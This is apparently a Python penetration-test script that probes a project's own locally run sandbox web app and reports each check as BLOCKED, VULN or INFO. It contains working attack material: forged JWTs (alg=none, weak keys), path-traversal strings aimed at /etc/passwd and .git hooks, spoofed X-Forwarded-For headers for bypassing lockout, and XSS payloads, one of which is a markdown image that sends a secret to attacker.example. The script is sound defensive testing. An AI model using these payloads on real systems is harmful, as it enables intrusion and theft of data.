"""
Black-box attacks against the running sandbox, as an outsider who has read
the public source. Start run_sandbox.py first, then:

    uv run python tooling/sandbox/attack_http.py

Each check prints BLOCKED (defence held), VULN (attack worked) or INFO
(behaviour worth knowing, not a break by itself). Exit code = number of VULNs.
"""

import base64
import hashlib
import hmac
import json
import sqlite3
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

import sandbox_env as sb

RESULTS: list[tuple[str, str, str]] = []


def report(status: str, name: str, detail: str = "") -> None:
    RESULTS.append((status, name, detail))
    colour = {"BLOCKED": "\033[32m", "VULN": "\033[31m", "INFO": "\033[33m"}[status]
    print(f"{colour}{status:8}\033[0m {name}" + (f"  — {detail}" if detail else ""))


def http(method, path, *, token=None, body=None, headers=None, raw=None):
    h = dict(headers or {})
    if token:
        h["Authorization"] = f"Bearer {token}"
    data = raw
    if body is not None:
        data = json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(sb.BASE_URL + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)


def login(user, pw=None, xff=None):
    pw = pw if pw is not None else sb.USERS[user][0]
    headers = {"X-Forwarded-For": xff} if xff else None
    return http("POST", "/api/auth/login", body={"username": user, "password": pw}, headers=headers)


def token_for(user):
    s, b, _ = login(user)
    assert s == 200, f"login {user} failed: {s} {b}"
    return json.loads(b)["token"]


def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def forge(payload: dict, key: bytes | None, alg="HS256") -> str:
    head = b64(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    body = b64(json.dumps(payload).encode())
    if key is None:
        return f"{head}.{body}."
    sig = hmac.new(key, f"{head}.{body}".encode(), hashlib.sha256).digest()
    return f"{head}.{body}.{b64(sig)}"


def leaked(text: str) -> str | None:
    for c in (sb.CANARY_OUT, sb.CANARY_DB, sb.CANARY_SRC):
        if c in text:
            return c
    return None


# ---------------------------------------------------------------------------
# 1. Unauthenticated access
# ---------------------------------------------------------------------------

def t_unauth_routes():
    sb.apply_env()
    from app import app  # route map only — requests still go over HTTP
    public = {"/healthz", "/api/auth/config", "/api/auth/login"}
    opened = []
    for rule in app.url_map.iter_rules():
        if rule.endpoint == "static" or rule.rule in public:
            continue
        path = rule.rule.replace("<int:event_id>", "1")
        for m in sorted(rule.methods - {"HEAD", "OPTIONS"}):
            s, _, _ = http(m, path, body={} if m != "GET" else None)
            if s != 401:
                opened.append(f"{m} {path} -> {s}")
    if opened:
        report("VULN", "Unauthenticated route access", "; ".join(opened))
    else:
        report("BLOCKED", "Every non-public route returns 401 without a token")


# ---------------------------------------------------------------------------
# 2. Token forgery
# ---------------------------------------------------------------------------

def t_token_forgery():
    now = int(time.time())
    base = {"sub": "owner", "role": "admin", "ver": 0, "iat": now, "exp": now + 3600}
    cases = {
        "alg=none": forge(base, None, alg="none"),
        "signed with empty key": forge(base, b""),
        "signed with 'secret'": forge(base, b"secret"),
        "signed with example placeholder": forge(base, b"change-me"),
        "expired but validly shaped": forge({**base, "exp": now - 10}, b"x"),
    }
    for name, tok in cases.items():
        s, _, _ = http("GET", "/api/auth/me", token=tok)
        report("BLOCKED" if s == 401 else "VULN", f"Forged JWT ({name})", f"status {s}")


def t_role_escalation(tok_limited):
    s, _, _ = http("GET", "/api/admin/login-events", token=tok_limited)
    report("BLOCKED" if s == 403 else "VULN", "'user' role reading admin login events", f"status {s}")
    for p in ("/api/admin/ai-usage", "/api/admin/alerts", "/api/admin/system"):
        s, _, _ = http("GET", p, token=tok_limited)
        report("BLOCKED" if s == 403 else "VULN", f"'user' role GET {p}", f"status {s}")


def t_revocation():
    tok = token_for("limited")
    http("POST", "/api/auth/logout", token=tok)
    s, _, _ = http("GET", "/api/auth/me", token=tok)
    report("BLOCKED" if s == 401 else "VULN", "Token reuse after logout", f"status {s}")


# ---------------------------------------------------------------------------
# 3. Brute force / lockout
# ---------------------------------------------------------------------------

def t_bruteforce():
    statuses = [login("owner", "wrong-%d" % i)[0] for i in range(6)]
    report("BLOCKED" if statuses[-1] == 429 else "VULN",
           "Password brute force (same IP)", f"statuses {statuses}")
    # Right password while locked must still be refused.
    s, _, _ = login("owner")
    report("BLOCKED" if s == 429 else "VULN", "Correct password accepted while locked out", f"status {s}")

    # Rotating X-Forwarded-For. ProxyFix trusts one hop: without nginx in
    # front, the attacker's own header IS that hop. In prod nginx appends the
    # real IP ($proxy_add_x_forwarded_for), so only the direct-to-backend case
    # is exposed — this shows why the backend port must never be public.
    statuses = [login("limited", "wrong", xff=f"10.9.{i}.1")[0] for i in range(8)]
    if 429 in statuses:
        report("BLOCKED", "Lockout bypass via spoofed X-Forwarded-For", f"{statuses}")
    else:
        report("INFO", "Lockout bypass via spoofed X-Forwarded-For (no proxy in front)",
               "each spoofed IP gets a fresh budget; safe only while :5000 stays bound to 127.0.0.1")

    # Username enumeration via timing.
    def avg(user):
        t = []
        for _ in range(3):
            t0 = time.perf_counter()
            login(user, "nope", xff=f"172.16.{len(t)}.{hash(user) % 250}")
            t.append(time.perf_counter() - t0)
        return sum(t) / len(t)
    a, b = avg("limited"), avg("no-such-user-xyz")
    ratio = max(a, b) / max(min(a, b), 1e-6)
    report("BLOCKED" if ratio < 1.5 else "VULN", "Username enumeration by login timing",
           f"existing {a*1000:.0f}ms vs missing {b*1000:.0f}ms")


# ---------------------------------------------------------------------------
# 4. Path traversal on every path-taking route
# ---------------------------------------------------------------------------

TRAVERSALS = [
    "../outside.md", "../../outside.md", "..\\..\\outside.md", "../sibling.md",
    "VIT/../../sibling.md", "VIT/../../../outside.md", "/etc/passwd",
    "db/leak.md", "./db/leak.md", "VIT/../db/leak.md", "DB/leak.md",
    "../../secrets_app.py", "..%2f..%2foutside.md", "....//....//outside.md",
    str(sb.SANDBOX / "outside.md"), "C:outside.md",
]


def t_traversal_reads(tok):
    for route in ("/api/projects/content", "/api/projects/structured", "/api/logs/content"):
        hits = []
        for p in TRAVERSALS:
            s, body, _ = http("GET", f"{route}?path={urllib.parse.quote(p)}", token=tok)
            c = leaked(body)
            if c:
                hits.append(f"{p!r} -> {c}")
        report("VULN" if hits else "BLOCKED", f"Traversal read via GET {route}", "; ".join(hits))


def t_traversal_writes(tok):
    hits = []
    marker = "PWNED-BY-SANDBOX"
    for p in TRAVERSALS + [".git/hooks/pre-commit.md", ".git/config.md"]:
        http("PUT", "/api/projects/content", token=tok, body={"path": p, "content": marker})
        http("POST", "/api/ai/edit", token=tok, body={"file_path": p, "instruction": "x"})
    # Anything outside the corpus proper that now contains the marker?
    for f in [sb.SANDBOX / "outside.md", sb.DATA_ROOT / "sibling.md", sb.USER_ROOT / "db" / "leak.md"]:
        if marker in f.read_text(encoding="utf-8", errors="replace"):
            hits.append(str(f))
    gitdir = sb.USER_ROOT / ".git"
    for f in gitdir.rglob("*.md"):
        hits.append(f"wrote inside .git/: {f.relative_to(gitdir)}")
    report("VULN" if hits else "BLOCKED", "Traversal / .git write via PUT /api/projects/content", "; ".join(hits))


def t_task_oracle(tok):
    """toggle/promote read the file before validating — existence oracle?"""
    hits = []
    for route in ("/api/today/tasks/toggle", "/api/today/tasks/promote", "/api/today/tasks/cancel"):
        for p in ("../outside.md", "../sibling.md", "../../outside.md"):
            s, body, _ = http("POST", route, token=tok, body={"rel_path": p, "text": sb.CANARY_OUT})
            if s == 200:
                hits.append(f"{route} {p} -> 200")
    report("VULN" if hits else "BLOCKED", "Task toggle/promote on files outside the corpus", "; ".join(hits))
    after = (sb.SANDBOX / "outside.md").read_text(encoding="utf-8")
    if f"- [x] {sb.CANARY_OUT}" in after or f"- [-] {sb.CANARY_OUT}" in after:
        report("VULN", "Task toggle modified a file outside the corpus")


# ---------------------------------------------------------------------------
# 5. Stored XSS payloads (backend accepts them; frontend DOMPurify is the gate)
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "[click](javascript:alert(1))",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "![t](https://attacker.example/c?d=SECRET)",
]


def t_stored_xss(tok):
    content = "# XSS test\n\n" + "\n\n".join(XSS_PAYLOADS) + "\n"
    s, body, _ = http("PUT", "/api/projects/content", token=tok,
                      body={"path": "VIT/xss-test.md", "content": content})
    report("INFO", "Backend stores raw HTML/markdown payloads (expected)",
           f"status {s}; rendering safety is tested by attack_render.mjs")


# ---------------------------------------------------------------------------
# 6. Misc: CORS, body size, email relay, error leakage
# ---------------------------------------------------------------------------

def t_cors(tok):
    s, _, h = http("GET", "/api/auth/me", token=tok, headers={"Origin": "https://evil.example"})
    acao = h.get("Access-Control-Allow-Origin")
    report("BLOCKED" if acao in (None, "") else "VULN", "CORS reflects attacker origin", f"ACAO={acao!r}")


def t_body_limit(tok):
    big = b'{"path":"VIT/big.md","content":"' + b"A" * (3 * 1024 * 1024) + b'"}'
    s, _, _ = http("PUT", "/api/projects/content", token=tok, raw=big,
                   headers={"Content-Type": "application/json"})
    report("BLOCKED" if s == 413 else "VULN", "3 MB request body", f"status {s}")


def t_email_relay(tok):
    s, _, _ = http("POST", "/api/integrations/email", token=tok,
                   body={"to": "anyone@evil.example", "subject": "hi", "body": "corpus dump"})
    report("INFO", "Logged-in user can queue email to any address",
           f"status {s} — by design (owner-only); only matters if a token is stolen")


def t_error_leakage(tok):
    s, body, _ = http("POST", "/api/ai/chat", token=tok, body={"message": "hello"})
    paths = [m for m in ("C:\\", "/home/", "\\Users\\", "Traceback", "sk-ant") if m in body]
    report("VULN" if paths else "BLOCKED", "Internal paths / tracebacks in error responses",
           f"status {s} {paths or ''}")


def t_queue_inspection():
    conn = sqlite3.connect(sb.DB_PATH)
    rows = conn.execute("SELECT task_type, COUNT(*) FROM task_queue GROUP BY task_type").fetchall()
    report("INFO", "Tasks an attacker managed to enqueue", str(dict(rows)))


def main():
    s, _, _ = http("GET", "/healthz")
    if s != 200:
        sys.exit("sandbox not running — start tooling/sandbox/run_sandbox.py first")
    tok_owner, tok_limited = token_for("owner"), token_for("limited")

    t_unauth_routes()
    t_token_forgery()
    t_role_escalation(tok_limited)
    t_revocation()
    t_traversal_reads(tok_owner)
    t_traversal_writes(tok_owner)
    t_task_oracle(tok_owner)
    t_stored_xss(tok_owner)
    t_cors(tok_owner)
    t_body_limit(tok_owner)
    t_email_relay(tok_owner)
    t_error_leakage(tok_owner)
    t_bruteforce()          # last — it locks accounts
    t_queue_inspection()

    vulns = sum(1 for r in RESULTS if r[0] == "VULN")
    print(f"\n{len(RESULTS)} checks, {vulns} VULN")
    sys.exit(vulns)


if __name__ == "__main__":
    main()
